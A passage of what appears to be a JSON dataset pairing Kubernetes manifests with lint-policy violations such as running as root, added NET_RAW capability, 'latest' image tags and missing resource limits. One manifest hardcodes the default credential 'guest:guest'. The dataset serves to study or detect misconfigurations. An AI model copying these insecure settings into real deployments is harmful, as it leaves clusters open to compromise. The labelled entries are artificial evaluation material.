    "manifest_path": "data/manifests/the_stack_sample/sample_3580.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ingress-router\n  namespace: openshift-ingress\n  labels:\n    k8s-app: ingress-router\nspec:\n  selector:\n    matchLabels:\n      k8s-app: ingress-router\n  template:\n    metadata:\n      labels:\n        k8s-app: ingress-router\n    spec:\n      serviceAccountName: ingress-router\n      containers:\n      - env:\n        - name: ROUTER_LISTEN_ADDR\n          value: 0.0.0.0:1936\n        - name: ROUTER_METRICS_TYPE\n          value: haproxy\n        - name: ROUTER_SERVICE_HTTPS_PORT\n          value: '443'\n        - name: ROUTER_SERVICE_HTTP_PORT\n          value: '80'\n        - name: ROUTER_THREADS\n          value: '4'\n        image: openshift/origin-haproxy-router:v4.0.0\n        livenessProbe:\n          httpGet:\n            host: localhost\n            path: /healthz\n            port: 1936\n          initialDelaySeconds: 10\n        name: router\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 1936\n          name: stats\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            host: localhost\n            path: healthz/ready\n            port: 1936\n          initialDelaySeconds: 10\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ingress-router\" not found"
  },
  {
    "id": "9429",
    "manifest_path": "data/manifests/the_stack_sample/sample_3580.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ingress-router\n  namespace: openshift-ingress\n  labels:\n    k8s-app: ingress-router\nspec:\n  selector:\n    matchLabels:\n      k8s-app: ingress-router\n  template:\n    metadata:\n      labels:\n        k8s-app: ingress-router\n    spec:\n      serviceAccountName: ingress-router\n      containers:\n      - env:\n        - name: ROUTER_LISTEN_ADDR\n          value: 0.0.0.0:1936\n        - name: ROUTER_METRICS_TYPE\n          value: haproxy\n        - name: ROUTER_SERVICE_HTTPS_PORT\n          value: '443'\n        - name: ROUTER_SERVICE_HTTP_PORT\n          value: '80'\n        - name: ROUTER_THREADS\n          value: '4'\n        image: openshift/origin-haproxy-router:v4.0.0\n        livenessProbe:\n          httpGet:\n            host: localhost\n            path: /healthz\n            port: 1936\n          initialDelaySeconds: 10\n        name: router\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 1936\n          name: stats\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            host: localhost\n            path: healthz/ready\n            port: 1936\n          initialDelaySeconds: 10\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"router\" is not set to runAsNonRoot"
  },
  {
    "id": "9430",
    "manifest_path": "data/manifests/the_stack_sample/sample_3580.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ingress-router\n  namespace: openshift-ingress\n  labels:\n    k8s-app: ingress-router\nspec:\n  selector:\n    matchLabels:\n      k8s-app: ingress-router\n  template:\n    metadata:\n      labels:\n        k8s-app: ingress-router\n    spec:\n      serviceAccountName: ingress-router\n      containers:\n      - env:\n        - name: ROUTER_LISTEN_ADDR\n          value: 0.0.0.0:1936\n        - name: ROUTER_METRICS_TYPE\n          value: haproxy\n        - name: ROUTER_SERVICE_HTTPS_PORT\n          value: '443'\n        - name: ROUTER_SERVICE_HTTP_PORT\n          value: '80'\n        - name: ROUTER_THREADS\n          value: '4'\n        image: openshift/origin-haproxy-router:v4.0.0\n        livenessProbe:\n          httpGet:\n            host: localhost\n            path: /healthz\n            port: 1936\n          initialDelaySeconds: 10\n        name: router\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 1936\n          name: stats\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            host: localhost\n            path: healthz/ready\n            port: 1936\n          initialDelaySeconds: 10\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"router\" has memory limit 0"
  },
  {
    "id": "9431",
    "manifest_path": "data/manifests/the_stack_sample/sample_3581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: todo-application\n  name: todolist-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: todolist-backend\n  template:\n    metadata:\n      labels:\n        app: todolist-backend\n    spec:\n      containers:\n      - name: todolist-backend\n        image: niklasku/dev_kub_todolist_backend:2_8_2\n        volumeMounts:\n        - name: config-mount\n          mountPath: /app/todoapp-backend/.env\n          subPath: .env\n          readOnly: true\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-password\n              key: DB_PASSWORD\n      volumes:\n      - name: config-mount\n        configMap:\n          name: todo-app-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"todolist-backend\" does not have a read-only root file system"
  },
  {
    "id": "9432",
    "manifest_path": "data/manifests/the_stack_sample/sample_3581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: todo-application\n  name: todolist-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: todolist-backend\n  template:\n    metadata:\n      labels:\n        app: todolist-backend\n    spec:\n      containers:\n      - name: todolist-backend\n        image: niklasku/dev_kub_todolist_backend:2_8_2\n        volumeMounts:\n        - name: config-mount\n          mountPath: /app/todoapp-backend/.env\n          subPath: .env\n          readOnly: true\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-password\n              key: DB_PASSWORD\n      volumes:\n      - name: config-mount\n        configMap:\n          name: todo-app-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"todolist-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "9433",
    "manifest_path": "data/manifests/the_stack_sample/sample_3581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: todo-application\n  name: todolist-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: todolist-backend\n  template:\n    metadata:\n      labels:\n        app: todolist-backend\n    spec:\n      containers:\n      - name: todolist-backend\n        image: niklasku/dev_kub_todolist_backend:2_8_2\n        volumeMounts:\n        - name: config-mount\n          mountPath: /app/todoapp-backend/.env\n          subPath: .env\n          readOnly: true\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-password\n              key: DB_PASSWORD\n      volumes:\n      - name: config-mount\n        configMap:\n          name: todo-app-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"todolist-backend\" has cpu request 0"
  },
  {
    "id": "9434",
    "manifest_path": "data/manifests/the_stack_sample/sample_3581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: todo-application\n  name: todolist-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: todolist-backend\n  template:\n    metadata:\n      labels:\n        app: todolist-backend\n    spec:\n      containers:\n      - name: todolist-backend\n        image: niklasku/dev_kub_todolist_backend:2_8_2\n        volumeMounts:\n        - name: config-mount\n          mountPath: /app/todoapp-backend/.env\n          subPath: .env\n          readOnly: true\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-password\n              key: DB_PASSWORD\n      volumes:\n      - name: config-mount\n        configMap:\n          name: todo-app-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"todolist-backend\" has memory limit 0"
  },
  {
    "id": "9435",
    "manifest_path": "data/manifests/the_stack_sample/sample_3585.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    platform.confluent.io/cr-name: connect\n    platform.confluent.io/namespace: confluent\n    platform.confluent.io/type: connect\n    prometheus.io/port: '7778'\n    prometheus.io/scrape: 'true'\n  name: connect-bootstrap\n  namespace: confluent\n  labels:\n    confluent-platform: 'true'\n    cr-name: connect\n    type: connect\nspec:\n  ports:\n  - name: external\n    port: 8083\n    protocol: TCP\n    targetPort: 8083\n  selector:\n    app: connect\n    clusterId: confluent\n    confluent-platform: 'true'\n    type: connect\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:connect clusterId:confluent confluent-platform:true type:connect])"
  },
  {
    "id": "9436",
    "manifest_path": "data/manifests/the_stack_sample/sample_3589.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: video-stream-app1\nspec:\n  type: NodePort\n  selector:\n    app: objectdetect\n  ports:\n  - name: objectdetect-video\n    protocol: TCP\n    port: 8080\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:objectdetect])"
  },
  {
    "id": "9437",
    "manifest_path": "data/manifests/the_stack_sample/sample_3594.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: meta-data-repository\n  namespace: oih-dev-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: meta-data-repository\n  template:\n    metadata:\n      labels:\n        app: meta-data-repository\n    spec:\n      containers:\n      - name: meta-data-repository\n        image: openintegrationhub/meta-data-repository:latest\n        env:\n        - name: IAM_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: iamtoken\n        - name: MONGODB_CONNECTION\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: metaDataMongourl\n        - name: INTROSPECT_TYPE\n          value: basic\n        - name: RABBITMQ_URI\n          value: amqp://guest:guest@rabbitmq-service.oih-dev-ns.svc.cluster.local:5672\n        - name: INTROSPECT_ENDPOINT_BASIC\n          value: http://iam.oih-dev-ns.svc.cluster.local:3099/api/v1/tokens/introspect\n        - name: ORIGINWHITELIST\n          value: localoih.com,http://web-ui.localoih.com\n        - name: PORT\n          value: '3000'\n        - name: API_BASE\n          value: /api/v1\n        - name: LOGGING_LEVEL\n          value: error\n        - name: DEBUG_MODE\n          value: 'false'\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 120\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: '0.1'\n            memory: 500Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"meta-data-repository\" is using an invalid container image, \"openintegrationhub/meta-data-repository:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9438",
    "manifest_path": "data/manifests/the_stack_sample/sample_3594.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: meta-data-repository\n  namespace: oih-dev-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: meta-data-repository\n  template:\n    metadata:\n      labels:\n        app: meta-data-repository\n    spec:\n      containers:\n      - name: meta-data-repository\n        image: openintegrationhub/meta-data-repository:latest\n        env:\n        - name: IAM_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: iamtoken\n        - name: MONGODB_CONNECTION\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: metaDataMongourl\n        - name: INTROSPECT_TYPE\n          value: basic\n        - name: RABBITMQ_URI\n          value: amqp://guest:guest@rabbitmq-service.oih-dev-ns.svc.cluster.local:5672\n        - name: INTROSPECT_ENDPOINT_BASIC\n          value: http://iam.oih-dev-ns.svc.cluster.local:3099/api/v1/tokens/introspect\n        - name: ORIGINWHITELIST\n          value: localoih.com,http://web-ui.localoih.com\n        - name: PORT\n          value: '3000'\n        - name: API_BASE\n          value: /api/v1\n        - name: LOGGING_LEVEL\n          value: error\n        - name: DEBUG_MODE\n          value: 'false'\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 120\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: '0.1'\n            memory: 500Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"meta-data-repository\" does not have a read-only root file system"
  },
  {
    "id": "9439",
    "manifest_path": "data/manifests/the_stack_sample/sample_3594.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: meta-data-repository\n  namespace: oih-dev-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: meta-data-repository\n  template:\n    metadata:\n      labels:\n        app: meta-data-repository\n    spec:\n      containers:\n      - name: meta-data-repository\n        image: openintegrationhub/meta-data-repository:latest\n        env:\n        - name: IAM_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: iamtoken\n        - name: MONGODB_CONNECTION\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: metaDataMongourl\n        - name: INTROSPECT_TYPE\n          value: basic\n        - name: RABBITMQ_URI\n          value: amqp://guest:guest@rabbitmq-service.oih-dev-ns.svc.cluster.local:5672\n        - name: INTROSPECT_ENDPOINT_BASIC\n          value: http://iam.oih-dev-ns.svc.cluster.local:3099/api/v1/tokens/introspect\n        - name: ORIGINWHITELIST\n          value: localoih.com,http://web-ui.localoih.com\n        - name: PORT\n          value: '3000'\n        - name: API_BASE\n          value: /api/v1\n        - name: LOGGING_LEVEL\n          value: error\n        - name: DEBUG_MODE\n          value: 'false'\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 120\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: '0.1'\n            memory: 500Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"meta-data-repository\" is not set to runAsNonRoot"
  },
  {
    "id": "9440",
    "manifest_path": "data/manifests/the_stack_sample/sample_3594.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: meta-data-repository\n  namespace: oih-dev-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: meta-data-repository\n  template:\n    metadata:\n      labels:\n        app: meta-data-repository\n    spec:\n      containers:\n      - name: meta-data-repository\n        image: openintegrationhub/meta-data-repository:latest\n        env:\n        - name: IAM_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: iamtoken\n        - name: MONGODB_CONNECTION\n          valueFrom:\n            secretKeyRef:\n              name: shared-secret\n              key: metaDataMongourl\n        - name: INTROSPECT_TYPE\n          value: basic\n        - name: RABBITMQ_URI\n          value: amqp://guest:guest@rabbitmq-service.oih-dev-ns.svc.cluster.local:5672\n        - name: INTROSPECT_ENDPOINT_BASIC\n          value: http://iam.oih-dev-ns.svc.cluster.local:3099/api/v1/tokens/introspect\n        - name: ORIGINWHITELIST\n          value: localoih.com,http://web-ui.localoih.com\n        - name: PORT\n          value: '3000'\n        - name: API_BASE\n          value: /api/v1\n        - name: LOGGING_LEVEL\n          value: error\n        - name: DEBUG_MODE\n          value: 'false'\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 120\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /healthcheck\n            port: 3000\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: '0.1'\n            memory: 500Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"meta-data-repository\" has cpu request 0"
  },
  {
    "id": "9441",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"kube-vip\" has ADD capability: \"NET_RAW\", which matched with the forbidden capability for containers"
  },
  {
    "id": "9442",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"kube-vip\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "9443",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9444",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-vip\" does not have a read-only root file system"
  },
  {
    "id": "9445",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-vip\" not found"
  },
  {
    "id": "9446",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-vip\" is not set to runAsNonRoot"
  },
  {
    "id": "9447",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-vip\" has cpu request 0"
  },
  {
    "id": "9448",
    "manifest_path": "data/manifests/the_stack_sample/sample_3595.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: br0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 192.168.2.39\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n            - SYS_TIME\n      serviceAccountName: kube-vip\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-vip\" has memory limit 0"
  },
  {
    "id": "9449",
    "manifest_path": "data/manifests/the_stack_sample/sample_3596.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: label-bot\n    environment: prod\n    service: label-bot\n  name: label-bot-worker\n  namespace: label-bot-prod\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: label-bot\n    environment: prod\n    service: label-bot\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:label-bot environment:prod service:label-bot])"
  },
  {
    "id": "9450",
    "manifest_path": "data/manifests/the_stack_sample/sample_3599.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registryssn3831.azurecr.io/tripinsights/tripviewer:1.0\n        env:\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-service.default.svc.cluster.local\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://user-profile-js-service.default.svc.cluster.local\n        - name: ASPNETCORE_ENVIRONMENT\n          value: Development\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tripviewer\" does not have a read-only root file system"
  },
  {
    "id": "9451",
    "manifest_path": "data/manifests/the_stack_sample/sample_3599.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registryssn3831.azurecr.io/tripinsights/tripviewer:1.0\n        env:\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-service.default.svc.cluster.local\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://user-profile-js-service.default.svc.cluster.local\n        - name: ASPNETCORE_ENVIRONMENT\n          value: Development\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tripviewer\" is not set to runAsNonRoot"
  },
  {
    "id": "9452",
    "manifest_path": "data/manifests/the_stack_sample/sample_3601.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: vwserver-service\n  labels:\n    run: vwserver\nspec:\n  ports:\n  - port: 6025\n    protocol: TCP\n  selector:\n    run: vwserver\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:vwserver])"
  },
  {
    "id": "9453",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
